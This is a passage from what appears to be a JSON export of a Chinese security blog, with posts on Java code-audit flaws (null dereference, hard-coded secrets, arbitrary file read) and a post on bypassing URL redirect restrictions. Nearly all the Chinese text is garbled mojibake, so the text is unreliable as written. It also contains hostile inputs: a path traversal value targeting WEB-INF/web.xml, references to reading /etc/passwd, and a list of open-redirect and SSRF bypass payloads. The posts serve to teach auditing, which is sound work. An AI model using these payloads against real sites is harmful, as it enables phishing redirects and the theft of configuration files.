å®¡è®¡","permalink":"http://www.vkxss.top/tags/Javaä»£ç å®¡è®¡/"}]},{"title":"Null Dereference","slug":"ä»£ç å®¡è®¡-Java-Null Dereference","date":"2019-08-20T07:23:43.000Z","updated":"2019-11-19T06:38:38.248Z","comments":true,"path":"2019/08/20/ä»£ç å®¡è®¡-Java-Null Dereference/","link":"","permalink":"http://www.vkxss.top/2019/08/20/ä»£ç å®¡è®¡-Java-Null Dereference/","excerpt":"","text":"1ã€Null Dereferenceï¼ˆç©ºæŒ‡é’ˆå¼‚å¸¸ï¼‰ 1.1ã€äº§ç”ŸåŸå› ï¼š 2.2ã€ä¿®å¤æ–¹æ¡ˆï¼š 1ã€Null Dereferenceï¼ˆç©ºæŒ‡é’ˆå¼‚å¸¸ï¼‰1.1ã€äº§ç”ŸåŸå› ï¼š å½“è¿åç¨‹åºå‘˜çš„ä¸€ä¸ªæˆ–å¤šä¸ªå‡è®¾æ—¶ï¼Œé€šå¸¸ä¼šå‡ºç° null æŒ‡é’ˆå¼‚å¸¸ã€‚å¦‚æœç¨‹åºæ˜ç¡®å°†å¯¹è±¡è®¾ç½®ä¸ºnullï¼Œä½†ç¨åå´é—´æ¥å¼•ç”¨è¯¥å¯¹è±¡ï¼Œåˆ™å°†å‡ºç° dereference-after-store é”™è¯¯ã€‚æ­¤é”™è¯¯é€šå¸¸æ˜¯å› ä¸ºç¨‹åºå‘˜åœ¨å£°æ˜å˜é‡æ—¶å°†å˜é‡åˆå§‹åŒ–ä¸º nullã€‚å¤§éƒ¨åˆ†ç©ºæŒ‡é’ˆé—®é¢˜åªä¼šå¼•èµ·ä¸€èˆ¬çš„è½¯ä»¶å¯é æ€§é—®é¢˜ï¼Œä½†å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿæ•…æ„è§¦å‘ç©ºæŒ‡é’ˆé—´æ¥å¼•ç”¨ï¼Œæ”»å‡»è€…å°±æœ‰å¯èƒ½åˆ©ç”¨å¼•å‘çš„å¼‚å¸¸ç»•è¿‡å®‰å…¨é€»è¾‘ï¼Œæˆ–è‡´ä½¿åº”ç”¨ç¨‹åºæ³„æ¼è°ƒè¯•ä¿¡æ¯ï¼Œè¿™äº›ä¿¡æ¯å¯¹äºè§„åˆ’éšåçš„æ”»å‡»ååˆ†æœ‰ç”¨ã€‚ ç¤ºä¾‹ï¼šåœ¨ä¸‹åˆ—ä»£ç ä¸­ï¼Œç¨‹åºå‘˜å°†å˜é‡ foo æ˜ç¡®è®¾ç½®ä¸º nullã€‚ç¨åï¼Œç¨‹åºå‘˜é—´æ¥å¼•ç”¨ fooï¼Œè€Œæœªæ£€æŸ¥å¯¹è±¡æ˜¯å¦ä¸º null å€¼ã€‚ å›¾1ï¼šå¼•èµ·Null Dereferenceæ¼æ´çš„ä»£ç  2.2ã€ä¿®å¤æ–¹æ¡ˆï¼š åœ¨é—´æ¥å¼•ç”¨å¯èƒ½ä¸º null å€¼çš„å¯¹è±¡ä¹‹å‰ï¼Œè¯·åŠ¡å¿…ä»”ç»†æ£€æŸ¥ã€‚å¦‚æœ‰å¯èƒ½ï¼Œåœ¨å¤„ç†èµ„æºçš„ä»£ç å‘¨å›´çš„åŒ…è£…å™¨ä¸­çº³å…¥ null æ£€æŸ¥ï¼Œç¡®ä¿åœ¨æ‰€æœ‰æƒ…å†µä¸‹å‡ä¼šæ‰§è¡Œ null æ£€æŸ¥ï¼Œå¹¶æœ€å¤§é™åº¦åœ°å‡å°‘å‡ºé”™çš„åœ°æ–¹ã€‚ å›¾2ï¼šä¿®å¤Null Dereferenceæ¼æ´åçš„ä»£ç ","categories":[{"name":"JAVA","slug":"JAVA","permalink":"http://www.vkxss.top/categories/JAVA/"}],"tags":[{"name":"Javaä»£ç å®¡è®¡","slug":"Javaä»£ç å®¡è®¡","permalink":"http://www.vkxss.top/tags/Javaä»£ç å®¡è®¡/"}]},{"title":"æ•æ„Ÿä¿¡æ¯ç¡¬ç¼–ç åœ¨ç¨‹åºä¸­","slug":"ä»£ç å®¡è®¡-æ•æ„Ÿä¿¡æ¯ç¡¬ç¼–ç åœ¨ç¨‹åºä¸­","date":"2019-08-20T04:25:40.000Z","updated":"2020-01-19T07:28:31.772Z","comments":true,"path":"2019/08/20/ä»£ç å®¡è®¡-æ•æ„Ÿä¿¡æ¯ç¡¬ç¼–ç åœ¨ç¨‹åºä¸­/","link":"","permalink":"http://www.vkxss.top/2019/08/20/ä»£ç å®¡è®¡-æ•æ„Ÿä¿¡æ¯ç¡¬ç¼–ç åœ¨ç¨‹åºä¸­/","excerpt":"","text":"1ã€æ•æ„Ÿä¿¡æ¯ç¡¬ç¼–ç åœ¨ç¨‹åºä¸­ 1.1ã€æè¿°ï¼š 1.2ã€å®¡è®¡æ–¹æ³•ï¼š 1.3ã€æ¼æ´ç¤ºä¾‹: 1.4ã€æ¼æ´å±å®³ï¼š 1.5ã€ä¿®å¤æ–¹æ¡ˆï¼š 1ã€æ•æ„Ÿä¿¡æ¯ç¡¬ç¼–ç åœ¨ç¨‹åºä¸­1.1ã€æè¿°ï¼š å¦‚æœå°†æ•æ„Ÿä¿¡æ¯ï¼ˆåŒ…æ‹¬å£ä»¤å’ŒåŠ å¯†å¯†é’¥ï¼‰ç¡¬ç¼–ç åœ¨ç¨‹åºä¸­ï¼Œå¯èƒ½ä¼šå°†æ•æ„Ÿä¿¡æ¯æš´éœ²ç»™æ”»å‡»è€…ã€‚ä»»ä½•èƒ½å¤Ÿè®¿é—®åˆ°classæ–‡ä»¶çš„äººéƒ½å¯ä»¥åç¼–è¯‘classæ–‡ä»¶å¹¶å‘ç°è¿™äº›æ•æ„Ÿä¿¡æ¯ã€‚å› æ­¤ï¼Œä¸èƒ½å°†ä¿¡æ¯ç¡¬ç¼–ç åœ¨ç¨‹åºä¸­ã€‚åŒæ—¶ï¼Œç¡¬ç¼–ç æ•æ„Ÿä¿¡æ¯ä¼šå¢åŠ ä»£ç ç®¡ç†å’Œç»´æŠ¤çš„éš¾åº¦ã€‚ 1.2ã€å®¡è®¡æ–¹æ³•ï¼š å…¨å±€æœç´¢ä»¥ä¸‹å…³é”®è¯ â€œpasswordâ€ 1.3ã€æ¼æ´ç¤ºä¾‹: æ¶æ„ç”¨æˆ·å¯ä»¥ä½¿ç”¨javap -c IPaddresså‘½ä»¤æ¥åç¼–è¯‘classæ¥å‘ç°å…¶ä¸­ç¡¬ç¼–ç çš„æœåŠ¡å™¨IPåœ°å€ã€‚åç¼–è¯‘å™¨çš„è¾“å‡ºä¿¡æ¯é€éœ²äº†æœåŠ¡å™¨çš„æ˜æ–‡IPåœ°å€ï¼š172.16.254.1ã€‚ å›¾1ï¼šé”™è¯¯ä»£ç  1.4ã€æ¼æ´å±å®³ï¼š å¾ˆå®¹æ˜“è¢«æ”»å‡»è€…åˆ©ç”¨ï¼Œå¯¼è‡´ç³»ç»Ÿæ•æ„Ÿä¿¡æ¯æ³„éœ²ã€‚ 1.5ã€ä¿®å¤æ–¹æ¡ˆï¼š æ•æ„Ÿä¿¡æ¯å­˜æ”¾åœ¨é…ç½®æ–‡ä»¶æˆ–æ•°æ®åº“ä¸­å¹¶åŠ å¯†å­˜å‚¨ã€‚(é‡‘èè¡Œä¸šå®‰å…¨ç³»æ•°æ›´é«˜) è¿™ä¸ªæ­£ç¡®ä»£ç ç¤ºä¾‹ä»ä¸€ä¸ªå®‰å…¨ç›®å½•ä¸‹çš„å¤–éƒ¨æ–‡ä»¶è·å–æœåŠ¡å™¨IPåœ°å€ã€‚å¹¶åœ¨å…¶ä½¿ç”¨å®Œåç«‹å³ä»å†…å­˜ä¸­å°†å…¶æ¸…é™¤å¯ä»¥é˜²æ­¢åç»­çš„ä¿¡æ¯æ³„éœ²ã€‚ å›¾2ï¼šæ­£ç¡®ä»£ç ","categories":[{"name":"JAVA","slug":"JAVA","permalink":"http://www.vkxss.top/categories/JAVA/"}],"tags":[{"name":"Javaä»£ç å®¡è®¡","slug":"Javaä»£ç å®¡è®¡","permalink":"http://www.vkxss.top/tags/Javaä»£ç å®¡è®¡/"}]},{"title":"ä»»æ„æ–‡ä»¶è¯»å–","slug":"ä»£ç å®¡è®¡-ä»»æ„æ–‡ä»¶è¯»å–","date":"2019-08-19T06:13:12.000Z","updated":"2019-11-19T06:38:25.068Z","comments":true,"path":"2019/08/19/ä»£ç å®¡è®¡-ä»»æ„æ–‡ä»¶è¯»å–/","link":"","permalink":"http://www.vkxss.top/2019/08/19/ä»£ç å®¡è®¡-ä»»æ„æ–‡ä»¶è¯»å–/","excerpt":"","text":"1ã€Any File Readï¼ˆä»»æ„æ–‡ä»¶è¯»å–ï¼‰ 1.1ã€æè¿°ï¼š 1.2ã€å®¡è®¡æ–¹æ³•ï¼š 1.3ã€æ¼æ´ç¤ºä¾‹: 1.3ã€æ¼æ´å±å®³: 1.4ã€ä¿®å¤æ–¹æ¡ˆï¼š 1ã€Any File Readï¼ˆä»»æ„æ–‡ä»¶è¯»å–ï¼‰1.1ã€æè¿°ï¼š ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼ˆUnrestricted File Uploadï¼‰ï¼Œæ˜¯ä¸€ç§å¸¸è§çš„Webå®‰å…¨æ¼æ´ï¼Œå› Webç¨‹åºæä¾›çš„æ–‡ä»¶æŸ¥çœ‹ä¸‹è½½ã€é™„ä»¶ä¸‹è½½ç­‰åŠŸèƒ½å­˜åœ¨å®‰å…¨ç¼ºé™·ï¼Œå¯¼è‡´é€šè¿‡ä¿®æ”¹æ–‡ä»¶è·¯å¾„å°±èƒ½å¤ŸæŸ¥çœ‹å’Œä¸‹è½½ä»»æ„æ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶åŒ…æ‹¬ï¼šæºä»£ç æ–‡ä»¶ã€ç³»ç»Ÿæ–‡ä»¶ï¼ˆ/etc/passwdã€C:/boot.iniç­‰ï¼‰ã€é…ç½®æ–‡ä»¶ï¼ˆconfig.phpã€/WEB-INF/web.xmlã€web.configç­‰ï¼‰ï¼Œé€ æˆç½‘ç«™æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œä¸¥é‡å±å®³ç½‘ç«™å®‰å…¨ã€‚ 1.2ã€å®¡è®¡æ–¹æ³•ï¼š å…¨å±€æœç´¢ä»¥ä¸‹å…³é”®è¯: â€œfileNameâ€, â€œfilePathâ€, â€œgetFileâ€, â€œgetWriterâ€, â€œMultipartFileâ€, â€œcreateNewFileâ€, â€œFileInputStreamâ€ 1.3ã€æ¼æ´ç¤ºä¾‹: ä»£ç åœ¨ downloadFile()å‡½æ•°ä¸­è·å–è¯·æ±‚å‚æ•°ä¸­çš„affixalNameçš„å€¼ï¼Œç„¶åèµ‹å€¼ç»™ FileName å˜é‡ï¼Œæ¥ç€åœ¨ 196 è¡Œå¤„é€šè¿‡æ‹¼æ¥å­—ç¬¦ä¸²èµ‹å€¼ç»™downPath å˜é‡ï¼Œç„¶ååœ¨ 198 è¡Œå¤„è°ƒç”¨ download å‡½æ•°å¹¶æŠŠ downPath çš„å€¼ä¼ è¿›å‡½æ•°ï¼Œdownload å‡½æ•°çš„ä»£ç å¦‚ä¸‹: å›¾1ï¼šæ¼æ´ä»£ç  download å‡½æ•°æŠŠ filePath å¤„çš„æ–‡ä»¶å†™åˆ° http å“åº”ä¸­ï¼Œåœ¨æ•´ä¸ªæµç¨‹ä¸­å¹¶æ²¡æœ‰å¯¹æ–‡ä»¶åçš„åˆæ³• æ€§è¿›è¡Œæ£€æŸ¥ï¼Œå­˜åœ¨ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ï¼Œå¦‚é€šè¿‡æŠŠ affixalName çš„å€¼è®¾ç½® ä¸º../../../WEB-INF/web.xml å¯ä»¥ä¸‹è½½ç½‘ç«™çš„ web.xml æ–‡ä»¶ã€‚ å›¾2ï¼šæ¼æ´ä»£ç  å›¾3ï¼šæ¼æ´ä»£ç  1.3ã€æ¼æ´å±å®³: ä»»æ„æ–‡ä»¶è¯»å–æ˜¯å±äºæ–‡ä»¶æ“ä½œæ¼æ´çš„ä¸€ç§ï¼Œä¸€èˆ¬ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´å¯ä»¥è¯»å–çš„é…ç½®ä¿¡æ¯ç”šè‡³ç³»ç»Ÿé‡è¦æ–‡ä»¶ã€‚ä¸¥é‡çš„è¯ï¼Œå°±å¯èƒ½å¯¼è‡´SSRFï¼Œè¿›è€Œæ¼«æ¸¸è‡³å†…ç½‘ã€‚ 1.4ã€ä¿®å¤æ–¹æ¡ˆï¼š æŒ‡å®šä¸‹è½½è·¯å¾„ä»¥é˜²æ­¢ç”¨æˆ·è¯»å–å’Œä¸‹è½½æŒ‡å®šç›®å½•ä»¥å¤–çš„æ–‡ä»¶ã€‚","categories":[{"name":"JAVA","slug":"JAVA","permalink":"http://www.vkxss.top/categories/JAVA/"}],"tags":[{"name":"Javaä»£ç å®¡è®¡","slug":"Javaä»£ç å®¡è®¡","permalink":"http://www.vkxss.top/tags/Javaä»£ç å®¡è®¡/"}]},{"title":"å¦‚ä½•ç»•è¿‡URLé™åˆ¶","slug":"æ¸—é€æµ‹è¯•-å¦‚ä½•ç»•è¿‡URLé™åˆ¶","date":"2019-07-20T04:25:40.000Z","updated":"2019-09-23T08:02:38.060Z","comments":true,"path":"2019/07/20/æ¸—é€æµ‹è¯•-å¦‚ä½•ç»•è¿‡URLé™åˆ¶/","link":"","permalink":"http://www.vkxss.top/2019/07/20/æ¸—é€æµ‹è¯•-å¦‚ä½•ç»•è¿‡URLé™åˆ¶/","excerpt":"","text":"1ã€å¦‚ä½•ç»•è¿‡URLé™åˆ¶ 1.1ã€æè¿°ï¼š 1.2ã€æ­£å¸¸æ€è·¯ï¼š 1.3ã€payloadï¼š 1.4ã€Bypass 0x01 åˆ©ç”¨é—®å·ç»•è¿‡é™åˆ¶ 0x02 åˆ©ç”¨åæ–œæ å’Œæ­£æ–œæ ç»•è¿‡é™åˆ¶ 0x03 åˆ©ç”¨@ç»•è¿‡URLé™åˆ¶ 0x04 åˆ©ç”¨ç™½åå•ç¼ºé™·ç»•è¿‡é™åˆ¶ 0x05 å¤šé‡éªŒè¯&amp;è·³è½¬ç»•è¿‡é™åˆ¶ 0x06 ç‚¹å‡»è§¦å‘è¾¾åˆ°ç»•è¿‡URLè·³è½¬é™åˆ¶ 0x07 åˆ©ç”¨xip.ioç»•è¿‡ 0x08 åˆ©ç”¨è¶…é“¾æ¥ç»•è¿‡å¯ä¿¡ç«™ç‚¹é™åˆ¶ 0x09 POSTå‚æ•°ä¸­çš„URLè·³è½¬ 0x10 åˆ©ç”¨#å·ç»•è¿‡ 0x09 FUZZ 1ã€å¦‚ä½•ç»•è¿‡URLé™åˆ¶1.1ã€æè¿°ï¼š URLé‡å®šå‘æ¼æ´ï¼ˆURL redirection vulnerabilityï¼‰ï¼Œæ˜¯ä¸€ç§å¸¸è§çš„Webå®‰å…¨æ¼æ´ï¼Œç”±äºç½‘ç«™URLé‡å®šå‘åŠŸèƒ½è®¾è®¡ä¸å½“ï¼Œæ²¡æœ‰éªŒè¯è·³è½¬çš„ç›®æ ‡URLæ˜¯å¦åˆæ³•ï¼Œç”¨æˆ·å¯é€šè¿‡æ­¤æ¼æ´è·³è½¬åˆ°ä»»æ„ç½‘ç«™ï¼Œè¿™ä¼šå¯¼è‡´å¯é€šè¿‡è¯¥ç½‘ç«™è·³è½¬åˆ°å­˜åœ¨æœ¨é©¬ã€ç—…æ¯’çš„ç½‘ç«™æˆ–è€…é’“é±¼ç½‘ç«™ï¼ŒæŸå®³ç½‘ç«™ç”¨æˆ·æƒåˆ©ã€ç½‘ç«™åèª‰ã€‚ 1.2ã€æ­£å¸¸æ€è·¯ï¼š å°±æ˜¯ç›´æ¥æ›¿æ¢åé¢çš„URLæ¥æ£€æµ‹æ˜¯å¦å­˜åœ¨ä»»æ„URLè·³è½¬ï¼Œå¦‚æœä¸å­˜åœ¨ï¼Œå°±ç›´æ¥è¿”å›åˆ°å®ƒè‡ªå·±çš„åŸŸåï¼Œå¦‚æœå­˜åœ¨ï¼Œå°±è·³è½¬åˆ°ä½ æŒ‡å®šçš„URL 1.3ã€payloadï¼š123456789101112- ///www.baidu.com/%2f%2e%2e- /https://%5cbaidu.com/- //www.baidu.com- /www.baidu.com- https://www.google.com/www.baidu.com- /%2Fbaidu%252Ecom- http://www.google.com\\.baidu.com- http://www.google.com\\@baidu.com- http://www.google.com\\#baidu.com- http://www.google.com\\?baidu.com- http://www.google.com\\\\baidu.com- http://www.google.com\\baidu.com: 1.4ã€Bypass0x01 åˆ©ç”¨é—®å·ç»•è¿‡é™åˆ¶ åˆ©ç”¨é—®å·ï¼Œè¿™æ˜¯ä¸€ä¸ªç‰¹æ€§ï¼Œåˆ©ç”¨é—®å·å¯ä»¥æˆåŠŸç»•è¿‡URLé™åˆ¶æ¯”å¦‚ï¼šhttp://www.aaa.com/acb?Url=http://login.aaa.com è¿™æ˜¯ä¸€ä¸ªè·³è½¬é“¾æ¥ï¼Œè·³è½¬åˆ°å®ƒçš„äºŒçº§åŸŸåä¸‹ï¼Œé‚£ä¹ˆè¿™ä¸ªé—®å·æ”¾å“ªé‡Œå¯ä»¥ç»•è¿‡å‘¢ï¼Ÿå…¶å®å°±æ˜¯æ”¾åˆ°å®ƒè‡ªèº«çš„åŸŸåå‰é¢ä¹Ÿå°±æ˜¯ä½ æ·»åŠ çš„æƒ³è¦è·³è½¬çš„åŸŸåçš„åé¢ï¼Œå¦‚ï¼šhttp://www.aaa.com/acb?Url=http://test.com?login.aaa.com é‚£ä¹ˆï¼Œå®ƒå…¶å®æ˜¯ä¼šè·³è½¬åˆ°è¿™ä¸ªtest.comåŸŸåä¸‹ï¼Œè¿™ä¸ªåŸŸåæ˜¯æˆ‘æƒ³è¦è·³è½¬çš„ä»»æ„åŸŸåï¼Œè€Œåé¢çš„å®ƒè‡ªèº«åŸŸåä¸€å®šè¦å¸¦ä¸Šï¼Œä¸å¸¦ä¸Šå°±æ— æ³•è¾…åŠ©ç”¨é—®å·?è¿™ä¸ªç‰¹æ€§æ¥è·³è½¬åˆ°æŒ‡å®šåŸŸåäº†ï¼Œè€Œè·³è½¬åï¼Œé—®å·å’Œé—®å·åé¢çš„å†…å®¹ä¼šå˜ä¸ºè¿™æ ·ï¼šhttp://www.test.com/?login.aaa.com 1payloadï¼šhttp://www.test.com/abcï¼Ÿurl=http//payload.com?test1.com 0x02 åˆ©ç”¨åæ–œæ å’Œæ­£æ–œæ ç»•è¿‡é™åˆ¶ æ¯”å¦‚ï¼šhttp://www.aaa.com/acb?Url=http://login.aaa.com/ åŒæ ·æ˜¯åœ¨å®ƒæœ¬èº«åŸŸåå‰åŠ ä¸Šæ­£æ–œæ ï¼Œç„¶åæ­£æ–œæ å‰é¢è·Ÿä¸Šä½ æƒ³è·³è½¬çš„åŸŸååœ°å€ã€‚å¦‚ï¼šhttp://www.aaa.com/acb?Url=http://test.com/login.aaa.comåæ–œæ æœ‰ä¸‰ç§æ€è·¯ä¸¤ä¸ªåæ–œæ ç»•è¿‡æ–¹æ³•æ¯”å¦‚ï¼šhttp://www.aaa.com/acb?Url=http://login.aaa.com/ åŒæ ·æ˜¯åœ¨å®ƒæœ¬èº«åŸŸåå‰åŠ ä¸Šä¸¤ä¸ªåæ–œæ ï¼Œç„¶åä¸¤ä¸ªåæ–œæ å‰é¢è·Ÿä¸Šä½ æƒ³è·³è½¬çš„åŸŸååœ°å€ã€‚å¦‚ï¼šhttp://www.aaa.com/acb?Url=http://test.com\\login.aaa.comä¸€ä¸ªåæ–œæ ç»•è¿‡æ–¹æ³•å¦‚ï¼šhttp://www.aaa.com/acb?Url=http://test.comlogin.aaa.comå¦ä¸€ç§æ€è·¯ï¼Œä¸€ä¸ªåæ–œæ ä¸€ä¸ªç‚¹åˆ©ç”¨.è¿™æ ·çš„æ ¼å¼ï¼Œä¹Ÿå°±æ˜¯ä¸€ä¸ªåæ–œæ åŠ ä¸€ä¸ªç‚¹æ¥è·³è¿‡é™åˆ¶ï¼Œå¦‚ï¼šhttp://www.aaa.com/acb?Url=http://test.com.login.aaa.com 1payloadï¼š/ \\ . 0x03 åˆ©ç”¨@ç»•è¿‡URLé™åˆ¶ å¦‚æœä½ ç”¨è¿™æ–¹æ³•åœ¨ç«ç‹é‡Œè¿›è¡Œè·³è½¬ï¼Œä¼šæœ‰å¼¹çª—æç¤ºï¼Œåœ¨å…¶å®ƒæ¸¸è§ˆå™¨åˆ™æ²¡æœ‰ã€‚å¦‚ï¼š&lt;a href=â€http://www.aaa.com/acb?Url=http://login.aaa.com@test.comâ€œâ€&gt;http://www.aaa.com/acb?Url=http://login.aaa.com@test.com åé¢çš„test.comå°±æ˜¯è¦è·³è½¬åˆ°çš„åŸŸåï¼Œå‰é¢çš„åŸŸåéƒ½æ˜¯ç”¨æ¥è¾…åŠ©ä»¥ç»•è¿‡é™åˆ¶çš„ã€‚ 1payloadï¼š@ 0x04 åˆ©ç”¨ç™½åå•ç¼ºé™·ç»•è¿‡é™åˆ¶ æœ‰çš„åŸŸåç™½åå•é™åˆ¶æ˜¯ä¸å…¨çš„ï¼Œæ¯”å¦‚å¦‚æœæƒ³åˆ©ç”¨ä¸€ä¸ªè·³è½¬ï¼Œè€Œè¿™ä¸ªè·³è½¬æ˜¯é€šç”¨ï¼Œåœ¨è¿™ä¸ªå…¬å¸ç½‘ç«™å¾ˆå¤šå­åŸŸåç­‰éƒ½å¯ä»¥è·³è½¬ï¼Œé‚£ä¹ˆä½ ä¹°ä¸ªåŸŸåä¹Ÿä¸ç®—è´µå¯¹å§ã€‚ä¸ºä»€ä¹ˆè¿™ä¹ˆè¯´å‘¢ï¼Œè¿™ä¸ªé—®é¢˜å°±æ˜¯ç™½åå•é™åˆ¶ä¸å½“ï¼Œæ¯”å¦‚ï¼Œå½“è·³è½¬çš„åŸŸååŒ…å«è¿™ä¸ªç½‘ç«™ä¸‹çš„æ‰€æœ‰åŸŸåï¼Œæ¯”å¦‚ï¼šhttp://www.aaa.com/acb?Url=http://login.aaa.comè¿™ä¸ªlogin.aaa.comä¹Ÿå¯ä»¥æ”¹æˆaaa.comåŒæ ·å¯ä»¥è·³è½¬å¯¹å§ï¼Œå› ä¸ºç™½åå•é‡Œåªè¦æœ‰åŒ…å«è¿™ä¸ªåŸŸåå°±ç›´æ¥æˆåŠŸè·³è½¬ã€‚é‚£ä¹ˆå½“æˆ‘åœ¨è¿™ä¸ªåŸŸåå‰é¢åŠ ä¸Šå¦‚testaaa.comï¼Œç™½åå•é‡Œä¼šæ£€æŸ¥æ˜¯å¦åŒ…å«aaa.comè¿™ä¸ªåŸŸåï¼Œå¦‚æœåŒ…å«ï¼Œå°±ç›´æ¥è·³è½¬ï¼Œè€Œå¹¶æ²¡æœ‰æ£€æŸ¥è¿™ä¸ªåŸŸåçš„æ•´ä¸ªä¿¡æ¯ï¼Œç„¶åå¯ä»¥åˆ©ç”¨è¿™ä¸ªé—®é¢˜ï¼Œç›´æ¥æ³¨å†Œä¸€ä¸ªtestaaa.comè¿™ä¸ªåŸŸåå°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªè·³è½¬ã€‚ 1Payload:testaaa.com 0x05 å¤šé‡éªŒè¯&amp;è·³è½¬ç»•è¿‡é™åˆ¶ ç°åœ¨å¾ˆå¤šç½‘ç«™éƒ½æœ‰å¤šé‡éªŒè¯ï¼Œæ¯”å¦‚ä½ ç™»é™†è´¦æˆ·åä¼šå‡ºç°å¦ä¸€ä¸ªéªŒè¯é¡µé¢ï¼Œè¾“å…¥æ‰‹æœºéªŒè¯ç è¿›è¡ŒéªŒè¯ï¼Œæ­¤æ—¶è¿™ä¸Šé¢çš„URLå¾ˆå¯èƒ½å­˜åœ¨ä»»æ„è·³è½¬çš„é—®é¢˜ã€‚å¤šé‡è·³è½¬çš„é—®é¢˜å¯¼è‡´å¯ç»•è¿‡URLé™åˆ¶æ¯”å¦‚http://www.aaa.com/acb?Url=http: â€¦ ttp://login.aaa.comå½“ç„¶ï¼Œè¿˜æœ‰å¤šé‡çš„ï¼Œè¿™ä¸ªç»“æ„çš„å¤šé‡è·³è½¬ä½ ä¿®æ”¹æœ€åé¢çš„URLå°±å¯ä»¥è¾¾åˆ°ä»»æ„URLè·³è½¬ï¼Œä¸­é—´çš„URLå°±æ²¡å¿…è¦åŠ¨äº†ã€‚ 0x06 ç‚¹å‡»è§¦å‘è¾¾åˆ°ç»•è¿‡URLè·³è½¬é™åˆ¶ æ¯”å¦‚å¾ˆå¤šç™»é™†é¡µé¢çš„åœ°æ–¹ï¼Œå…¶URLæ˜¯ä¸€ä¸ªè·³è½¬çš„URLå¦‚ï¼šhttp://www.aaa.com/acb?Url=http://test.comä½ ç›´æ¥ä¿®æ”¹äº†åé¢ä¸ºä»»æ„URLï¼Œä½†æ˜¯è¿˜æ˜¯åœç•™åœ¨åŸåœ°ï¼Œä¼¼ä¹æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œä½†æ˜¯ï¼Œå½“ä½ è¾“å…¥è´¦å·å’Œå¯†ç åç‚¹å‡»ç™»é™†æŒ‰é’®åï¼Œå°±ä¼šè§¦å‘è·³è½¬ã€‚å½“ç„¶ï¼Œè¿™ä¸ªè´¦æˆ·å’Œå¯†ç ä¸ä¸€å®šè¦å¯¹çš„ï¼Œéšä¾¿éƒ½å¯ä»¥ï¼Œä½†å¾—è§†ç³»ç»Ÿè€Œå®šå§ã€‚è¿™ä¸ªæˆ‘é‡åˆ°äº†å¾ˆå¤šï¼Œæ¯”å¦‚ä½ ä¿®æ”¹äº†åŸŸåï¼Œç„¶åç‚¹å‡»ç™»é™†ï¼Œç™»é™†æˆåŠŸåä¾¿å¯è§¦å‘è·³è½¬ï¼Œè¿™ä¹Ÿæ˜¯ä¸€ä¸ªæ¯”è¾ƒéšè”½çš„ç»•è¿‡URLé™åˆ¶çš„è·³è½¬ã€‚ 0x07 åˆ©ç”¨xip.ioç»•è¿‡ è¿™ä¸ªæˆ‘è¿˜æ²¡æœ‰åœ¨æµ‹è¯•ä¸­åº”ç”¨è¿‡ï¼Œå…¶è¯·æ±‚æ˜¯http://www.127.0.0.1.xip.io è¿™ä¸ªç»•è¿‡æ˜¯åœ¨SSRFåœºæ™¯ä¸­çš„ç»•è¿‡ï¼Œæ¯”å¦‚SSRFä½ è¦è¯»å–å†…ç½‘åœ°å€ï¼Œä¸€èˆ¬éƒ½åšäº†é™åˆ¶ï¼Œå¯ä»¥å°è¯•ç”¨è¿™æ–¹æ³•è¿›è¡Œç»•è¿‡é™åˆ¶ï¼Œä»è€Œè®¿é—®åˆ°å†…ç½‘ã€‚å¦å¤–ä¸€ç‚¹ï¼ŒURLè·³è½¬æ¶‰åŠçš„å®‰å…¨é—®é¢˜å¤§å®¶å¸¸è§çš„å°±æ˜¯é’“é±¼ï¼Œé‚£ä¹ˆåˆ©ç”¨è¿™ä¸ªæ€è·¯ä¹Ÿå¯è¾¾æˆä¸€ä¸ªé’“é±¼é—®é¢˜ï¼Œå¦‚ï¼Œhttp://www.qq.com.127.0.0.1.xip.ioå½“ä½ è®¿é—®qqè¿™ä¸ªåŸŸåæ—¶ï¼Œå…¶å®è¿™ä¸ªé“¾æ¥å·²ç»è¢«è§£æåˆ°åé¢è¿™ä¸ªipåœ°å€ä¸Šäº†ï¼Œé‚£ä¹ˆå®é™…è®¿é—®çš„å°±æ˜¯åé¢è¿™ä¸ªIPåœ°å€ã€‚ 0x08 åˆ©ç”¨è¶…é“¾æ¥ç»•è¿‡å¯ä¿¡ç«™ç‚¹é™åˆ¶ æ¯”å¦‚ä¸€ä¸ªURLï¼Œå®ƒæ˜¯å¯ä»¥ç›´æ¥è·³è½¬çš„ï¼Œä½†æ˜¯ä¸€èˆ¬æµ‹è¯•è·³è½¬æ—¶å¤§å®¶ä¹ æƒ¯ç”¨www.baidu.comæˆ–qq.comè¿™æ ·çš„å¯ä¿¡ç«™ç‚¹è¿›è¡Œæµ‹è¯•ï¼Œä½†æ˜¯æœ‰äº›ç½‘ç«™æ˜¯å¯ä»¥è·³è½¬è¿™äº›ç½‘ç«™çš„ã€‚åªè¦æ˜¯å¯ä¿¡ç«™ç‚¹ä¸”å¸¸ç”¨ï¼ŒåŸºæœ¬éƒ½å¯ä»¥è·³è½¬ï¼Œé‚£ä¹ˆè¿™å°±å±äºæ­£å¸¸çš„ä¸šåŠ¡é€»è¾‘äº†ï¼Œéš¾é“å°±è¿™æ ·é”™å¤±ä¸€ä¸ªURLè·³è½¬æ¼æ´äº†ï¼Ÿå…¶å®ä¸ç„¶ï¼Œåªè¦ä½ çš„URLè¢«ç™¾åº¦æ”¶å½•è¿‡ï¼Œé‚£ä¹ˆç›´æ¥æœç´¢ä½ çš„åŸŸåï¼Œsite:xxx.xxxå› ä¸ºä½ åœ¨ç™¾åº¦é‡Œç‚¹å‡»ä½ çš„åŸŸåï¼Œå®ƒä¼šå…ˆæ˜¯ä¸€ä¸ª302è·³è½¬ï¼Œè€Œè¿™ä¸ª302è·³è½¬å°±æ˜¯ç™¾åº¦ä¸‹çš„302è·³è½¬ï¼Œé‚£ä¹ˆè¿™æ ·å°±å¯ä»¥ç»•è¿‡å¯ä¿¡ç«™ç‚¹çš„é™åˆ¶ï¼Œä»è€Œè¾¾åˆ°è·³è½¬åˆ°æŒ‡å®šURLã€‚å½“ç„¶ï¼Œç™¾åº¦è¿™ä¸ª302æœ‰ç‚¹é•¿ï¼Œä½ ç»™å®ƒè¿›è¡ŒåŠ å¯†å°±è¡Œã€‚ 0x09 POSTå‚æ•°ä¸­çš„URLè·³è½¬ 